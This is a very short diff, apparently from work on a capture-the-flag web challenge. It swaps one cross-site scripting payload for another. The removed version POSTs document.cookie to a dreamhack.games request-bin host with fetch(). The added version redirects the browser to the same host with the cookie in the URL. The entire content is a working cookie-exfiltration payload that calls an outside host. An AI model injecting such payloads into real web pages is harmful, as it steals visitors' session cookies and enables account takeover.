@@ -1,5 +1,1 @@
-fetch('https://rfgoglh.request.dreamhack.games', {
-  method: 'POST',
-  mode: 'no-cors',
-  body: document.cookie
-});
+location.href="https://rfgoglh.request.dreamhack.games?cookie="+document.cookie
